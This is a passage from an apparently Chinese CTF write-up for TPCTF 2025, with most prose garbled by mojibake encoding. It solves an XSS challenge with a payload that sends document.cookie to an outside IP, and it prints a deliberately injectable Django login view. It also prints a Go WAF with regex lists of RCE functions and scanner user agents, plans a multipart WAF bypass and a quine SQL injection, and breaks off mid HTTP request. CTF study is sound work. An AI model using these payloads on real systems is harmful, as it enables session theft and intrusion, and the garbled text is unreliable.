3000&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸»è¦éœ€è¦å®¡è®¡çš„å°±æ˜¯webçš„ä»£ç ï¼Œbotå…¶å®å°±æ˜¯æºå¸¦flagæ¥è®¿é—®ã€‚</p><p>æ¥çœ‹çœ‹ä¸¤ä¸ªè·¯ç”±&#x2F;api&#x2F;layoutï¼Œ&#x2F;api&#x2F;post</p><p>å¯¹åº”é¡µé¢ä¸­çš„åŠŸèƒ½ç‚¹Create New Layoutå’ŒCreate New Post</p><p>ç¬¬ä¸€ä¸ªæ˜¯è®¾è®¡æ¨¡æ¿ï¼Œç¬¬äºŒä¸ªæ˜¯ä¾æ®æ¨¡æ¿æŠ•é€’å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const body = layout.replace(/\&#123;\&#123;content\&#125;\&#125;/g, () =&gt; sanitizedContent);</span><br></pre></td></tr></table></figure><p>æ­¤å¤„å­˜åœ¨æ›¿æ¢ï¼Œå°±æ˜¯æŠŠé¢„å®šä¹‰çš„å†…å®¹æ›¿æ¢æˆPOSTçš„å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const sanitizedContent = DOMPurify.sanitize(content);</span><br><span class="line">const sanitizedLayout = DOMPurify.sanitize(layout);</span><br></pre></td></tr></table></figure><p>åŒæ—¶æˆ‘ä»¬ä¹Ÿå‘ç°ä¸¤å¤„åŠŸèƒ½ç‚¹éƒ½æ˜¯å­˜åœ¨ä¿æŠ¤æªæ–½çš„ã€‚æœ‰ç‚¹éš¾åŠã€‚</p><p>è¿™æ ·çš„è¯ï¼Œæˆ‘ä»¬å”¯ä¸€èƒ½è€ƒè™‘çš„å°±æ˜¯æ‹¼æ¥äº†ï¼Œè®©ä¸¤ä¸ªéƒ½ä¸ä¼šè¢«è¿‡æ»¤ï¼Œä½†æ˜¯åˆèµ·æ¥åˆæ˜¯æ¶æ„çš„ï¼</p><p>å°è¯•æ„é€ payloadï¼šæ­¤å¤„çš„payloadæ˜¯ä¸ä¼šè¢«è¿‡æ»¤æ‰çš„ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;&#123;&#123;content&#125;&#125;&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x&quot; onerror=&quot;window.open(&#x27;http://156.238.233.113:4567/?cookie=&#x27;+document.cookie)</span><br></pre></td></tr></table></figure><img src="/2025/03/30/TPCTF2025-wp/image-20250324194507206.png" class="" title="This is an example image"><img src="/2025/03/30/TPCTF2025-wp/image-20250324194451759.png" class="" title="This is an example image"><p>ç„¶ååœ¨3000ç«¯å£çš„webä¸Šè¾“å…¥ä»¥å</p><img src="/2025/03/30/TPCTF2025-wp/image-20250324194602300.png" class="" title="This is an example image"><p>æ„Ÿè§‰å·²ç»æ‹¿æäº†ï¼Œå†ç”¨idåœ¨botä¸Šè®©botå»è®¿é—®ï¼</p><img src="/2025/03/30/TPCTF2025-wp/image-20250324194628528.png" class="" title="This is an example image"><p>ç›´æ¥æ‹¿æï¼ï¼</p><h2 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h2><p>é¢˜ç›®ä¸€çœ¼sqlæ³¨å…¥ï¼Œæ ¹æ®ä¸‹è½½åˆ°çš„æºç ï¼Œå¯ä»¥çŸ¥é“æ˜¯sqliteæ•°æ®åº“</p><p>æ¥ä¸‹æ¥å…³æ³¨ä¸€ä¸‹æºç ï¼ŒThe Most Importantï¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> connection</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create your views here.</span></span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse,HttpRequest</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> AdminUser,Blog</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request:HttpRequest</span>):</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;Welcome to TPCTF 2025&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>(<span class="params">request:HttpRequest</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method != <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;Welcome to TPCTF 2025&#x27;</span>)</span><br><span class="line">    username = request.POST.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> username != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;you are not admin.&#x27;</span>)</span><br><span class="line">    password = request.POST.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    users:AdminUser = AdminUser.objects.raw(<span class="string">&quot;SELECT * FROM blog_adminuser WHERE username=&#x27;%s&#x27; and password =&#x27;%s&#x27;&quot;</span> % (username,password))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">assert</span> password == users[<span class="number">0</span>].password</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(os.environ.get(<span class="string">&#x27;FLAG&#x27;</span>))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;wrong password&#x27;</span>)</span><br></pre></td></tr></table></figure><p>è®¿é—®&#x2F;flag&#x2F;ç›®å½•ï¼Œéœ€è¦POSTè¯·æ±‚ï¼Œä¼ å‚usernameä¸ºadminå’Œpasswordï¼Œ</p><p>æ¥ä¸‹æ¥è·å–flagçš„åŒ–éœ€è¦ç»è¿‡æ–­è¨€assert password &#x3D;&#x3D; users[0].passwordï¼Œusersåˆæ¥è‡ªäºusers:AdminUser &#x3D; AdminUser.objects.raw(â€œSELECT * FROM blog_adminuser WHERE username&#x3D;â€™%sâ€™ and password &#x3D;â€™%sâ€™â€ % (username,password))</p><p>è¿™é‡Œå°±æ„Ÿè§‰å¾ˆç†Ÿæ‚‰äº†ï¼Œsqlæ³¨å…¥é‡Œæœ‰ä¸€ç§å§¿åŠ¿å«quineæ³¨å…¥ï¼</p><blockquote><p>Quineåˆç§°ä¸ºè‡ªäº§ç”Ÿç¨‹åºï¼Œåœ¨sqlæ³¨å…¥ä¸­æ˜¯ä¸€ç§ä½¿å¾—è¾“å…¥çš„sqlè¯­å¥å’Œè¾“å‡ºçš„sqlè¯­å¥ä¸€è‡´çš„æŠ€æœ¯ï¼Œå°±æ˜¯è¯´è¾“å…¥çš„è¯­å¥è¿›è¡ŒæŸ¥è¯¢åç”Ÿæˆçš„ç»“æœä¸è¾“å…¥çš„è¯­å¥ç›¸åŒï¼ˆè‡ªå·±ç”Ÿæˆè‡ªå·±ï¼‰ï¼Œå¯ä»¥çœ‹åˆ°é¢˜ç›®ä¸­çš„åˆ¤æ–­æ­£æ˜¯è€ƒå¯Ÿäº†è¿™ä¸ªç‚¹ã€‚</p></blockquote><p>ä½†æ˜¯é¢˜ç›®æ€ä¹ˆä¼šè¿™ä¹ˆç®€å•å‘¢ï¼Ÿæ˜¯å­˜åœ¨wafçš„ï¼Œæˆ‘ä»¬çœ‹goç¨‹åº</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bytes&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;mime&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;regexp&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> backendURL = <span class="string">&quot;http://127.0.0.1:8000&quot;</span></span><br><span class="line"><span class="keyword">const</span> backendHost = <span class="string">&quot;127.0.0.1:8000&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> blockedIPs = <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">bool</span>&#123;</span><br><span class="line"><span class="string">&quot;1.1.1.1&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sqlInjectionPattern = regexp.MustCompile(<span class="string">`(?i)(union.*select|select.*from|insert.*into|update.*set|delete.*from|drop\s+table|--|#|\*\/|\/\*)`</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> rcePattern = regexp.MustCompile(<span class="string">`(?i)(\b(?:os|exec|system|eval|passthru|shell_exec|phpinfo|popen|proc_open|pcntl_exec|assert)\s*\(.+\))`</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> hotfixPattern = regexp.MustCompile(<span class="string">`(?i)(select)`</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> blockedUserAgents = []<span class="type">string</span>&#123;</span><br><span class="line"><span class="string">&quot;sqlmap&quot;</span>,</span><br><span class="line"><span class="string">&quot;nmap&quot;</span>,</span><br><span class="line"><span class="string">&quot;curl&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isBlockedIP</span><span class="params">(ip <span class="type">string</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line"><span class="keyword">return</span> blockedIPs[ip]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isMaliciousRequest</span><span class="params">(r *http.Request)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line"><span class="keyword">for</span> key, values := <span class="keyword">range</span> r.URL.Query() &#123;</span><br><span class="line"><span class="keyword">for</span> _, value := <span class="keyword">range</span> values &#123;</span><br><span class="line"><span class="keyword">if</span> sqlInjectionPattern.MatchString(value) &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;é˜»æ­¢ SQL æ³¨å…¥: å‚æ•° %s=%s&quot;</span>, key, value)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> rcePattern.MatchString(value) &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;é˜»æ­¢ RCE æ”»å‡»: å‚æ•° %s=%s&quot;</span>, key, value)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> hotfixPattern.MatchString(value) &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;å‚æ•° %s=%s&quot;</span>, key, value)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> r.Method == http.MethodPost &#123;</span><br><span class="line">ct := r.Header.Get(<span class="string">&quot;Content-Type&quot;</span>)</span><br><span class="line">mediaType, _, err := mime.ParseMediaType(ct)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;è§£æ Content-Type å¤±è´¥: %v&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> mediaType == <span class="string">&quot;multipart/form-data&quot;</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := r.ParseMultipartForm(<span class="number">65535</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;è§£æ POST å‚æ•°å¤±è´¥: %v&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := r.ParseForm(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;è§£æ POST å‚æ•°å¤±è´¥: %v&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key, values := <span class="keyword">range</span> r.PostForm &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;POST å‚æ•° %s=%v&quot;</span>, key, values)</span><br><span class="line"><span class="keyword">for</span> _, value := <span class="keyword">range</span> values &#123;</span><br><span class="line"><span class="keyword">if</span> sqlInjectionPattern.MatchString(value) &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;é˜»æ­¢ SQL æ³¨å…¥: POST å‚æ•° %s=%s&quot;</span>, key, value)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> rcePattern.MatchString(value) &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;é˜»æ­¢ RCE æ”»å‡»: POST å‚æ•° %s=%s&quot;</span>, key, value)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> hotfixPattern.MatchString(value) &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;POST å‚æ•° %s=%s&quot;</span>, key, value)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isBlockedUserAgent</span><span class="params">(userAgent <span class="type">string</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line"><span class="keyword">for</span> _, blocked := <span class="keyword">range</span> blockedUserAgents &#123;</span><br><span class="line"><span class="keyword">if</span> strings.Contains(strings.ToLower(userAgent), blocked) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">reverseProxyHandler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">clientIP := r.RemoteAddr</span><br><span class="line"><span class="keyword">if</span> isBlockedIP(clientIP) &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Forbidden&quot;</span>, http.StatusForbidden)</span><br><span class="line">log.Printf(<span class="string">&quot;é˜»æ­¢çš„ IP: %s&quot;</span>, clientIP)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bodyBytes, err := io.ReadAll(r.Body)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Bad Request&quot;</span>, http.StatusBadRequest)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r.Body = io.NopCloser(bytes.NewBuffer(bodyBytes))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> isMaliciousRequest(r) &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Malicious request detected&quot;</span>, http.StatusForbidden)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> isBlockedUserAgent(r.UserAgent()) &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Forbidden User-Agent&quot;</span>, http.StatusForbidden)</span><br><span class="line">log.Printf(<span class="string">&quot;é˜»æ­¢çš„ User-Agent: %s&quot;</span>, r.UserAgent())</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">proxyReq, err := http.NewRequest(r.Method, backendURL+r.RequestURI, bytes.NewBuffer(bodyBytes))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Bad Gateway&quot;</span>, http.StatusBadGateway)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">proxyReq.Header = r.Header</span><br><span class="line"></span><br><span class="line">client := &amp;http.Client&#123;</span><br><span class="line">CheckRedirect: <span class="function"><span class="keyword">func</span><span class="params">(req *http.Request, via []*http.Request)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">return</span> http.ErrUseLastResponse</span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp, err := client.Do(proxyReq)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Bad Gateway&quot;</span>, http.StatusBadGateway)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key, values := <span class="keyword">range</span> resp.Header &#123;</span><br><span class="line"><span class="keyword">for</span> _, value := <span class="keyword">range</span> values &#123;</span><br><span class="line"><span class="keyword">if</span> key == <span class="string">&quot;Location&quot;</span> &#123;</span><br><span class="line">value = strings.Replace(value, backendHost, r.Host, <span class="number">-1</span>)</span><br><span class="line">&#125;</span><br><span class="line">w.Header().Add(key, value)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">w.WriteHeader(resp.StatusCode)</span><br><span class="line">io.Copy(w, resp.Body)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">http.HandleFunc(<span class="string">&quot;/&quot;</span>, reverseProxyHandler)</span><br><span class="line">log.Println(<span class="string">&quot;Listen on 0.0.0.0:8080&quot;</span>)</span><br><span class="line">log.Fatal(http.ListenAndServe(<span class="string">&quot;:8080&quot;</span>, <span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™ä¸ª<code>waf</code>æ˜¯å®ç°äº†ä¸€ä¸ªç®€å•çš„åå‘ä»£ç†æœåŠ¡å™¨ï¼Œä¸»è¦åŠŸèƒ½æ˜¯å°†å®¢æˆ·ç«¯è¯·æ±‚è½¬å‘åˆ°åç«¯æœåŠ¡å™¨ï¼ŒåŒæ—¶å…·å¤‡ä¸€å®šçš„å®‰å…¨é˜²æŠ¤æœºåˆ¶ï¼Œèƒ½å¤Ÿæ£€æµ‹<code>SQL</code>æ³¨å…¥ã€è¿œç¨‹ä»£ç æ‰§è¡Œ<code>RCE</code>æ”»å‡»ï¼Œä»¥åŠå±è”½ç‰¹å®šçš„ <code>IP</code> å’Œç”¨æˆ·ä»£ç†ã€‚</p><p>ä½†æ˜¯æˆ‘ä»¬é€šè¿‡POSTï¼Œæ„Ÿè§‰æ˜¯æ²¡æœ‰åŠæ³•ç»•è¿‡wafçš„ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> r.Method == http.MethodPost &#123;</span><br><span class="line">ct := r.Header.Get(<span class="string">&quot;Content-Type&quot;</span>)</span><br><span class="line">mediaType, _, err := mime.ParseMediaType(ct)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;è§£æ Content-Type å¤±è´¥: %v&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> mediaType == <span class="string">&quot;multipart/form-data&quot;</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := r.ParseMultipartForm(<span class="number">65535</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;è§£æ POST å‚æ•°å¤±è´¥: %v&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := r.ParseForm(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;è§£æ POST å‚æ•°å¤±è´¥: %v&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ç‚¹å¥‡æ€ªçš„ï¼Œæ˜æ˜æ²¡æœ‰ä»»ä½•æ–‡ä»¶ä¸Šä¼ çš„ç‚¹ï¼Œå¯æ˜¯è¿™é‡Œæœ‰ä¸ªå…³äºæ–‡ä»¶ä¸Šä¼ çš„multipart&#x2F;form-data</p><p>è¿™é‡Œæä¾›ä¸€äº›æ–‡ç« ï¼š</p><p><a href="https://www.geekby.site/2022/03/waf-bypass/#bypass-%E6%80%9D%E8%B7%AF---%E5%88%9D%E7%BA%A7">https://www.geekby.site/2022/03/waf-bypass/#bypass-%E6%80%9D%E8%B7%AF---%E5%88%9D%E7%BA%A7</a></p><p><a href="https://blog.csdn.net/Thewei666/article/details/142408096">https://blog.csdn.net/Thewei666/article/details/142408096</a></p><p>è¿™é‡Œåæ¥å»å­¦äº†ä¸€ä¸‹ï¼Œè¯¦æƒ…<code>WAF Bypass</code>ç¬”è®°ã€‚</p><p>è¿™é‡Œçš„goæ–‡ä»¶å…¶å®å°±ç›¸å½“äºä¸€ä¸ªwafï¼Œpythonä½œä¸ºåç«¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€äº›æ‰‹æ³•æ¥ç»•è¿‡wafï¼Œå®ç°sqlæ³¨å…¥ï¼ŒåŒæ—¶è¿™é‡Œsqlæ³¨å…¥çš„æ–¹æ³•æ˜¯quineæ³¨å…¥ï¼</p><p>æ³¨æ„ä¸€ä¸‹ï¼šè¿™é‡Œpythonä½œä¸ºåç«¯ï¼Œå¯èƒ½è¯†åˆ«çš„æ˜¯ç¬¬äºŒè¡Œçš„ï¼Œwafè¯†åˆ«ç¬¬ä¸€è¡Œä»è€Œç»•è¿‡ï¼</p><img src="/2025/03/30/TPCTF2025-wp/image-20250326192812797.png" class="" title="This is an example image"><p>æ„Ÿè§‰è¦æ‹¿ä¸‹äº†ï¼Œç›´æ¥ç»•è¿‡äº†wafã€‚æ¥ä¸‹æ¥å°±æ˜¯quineæ³¨å…¥ï¼Œåœ¨passwordä¸­æ„é€ ã€‚</p><img src="/2025/03/30/TPCTF2025-wp/image-20250326195757686.png" class="" title="This is an example image"><p>è¿™é‡Œå¡äº†å¥½ä¹…ï¼ï¼sqliteæ²¡æœ‰<code>#</code>æ³¨é‡Šç¬¦ï¼ï¼ï¼ï¼è¦æ¢ç”¨<code>-- </code>ï¼ŒåŒæ—¶è¦æ³¨æ„union selectåçš„1,2ï¼Œè¿™ä¹Ÿæ˜¯ä¸èƒ½å°‘çš„ï¼æˆ‘çš„ç†è§£æ˜¯3æ˜¯å¯¹åº”çš„å›æ˜¾ä½ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST /flag/ HTTP/1.1</span><br><span class="line">Host: 156.238.233.113:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, 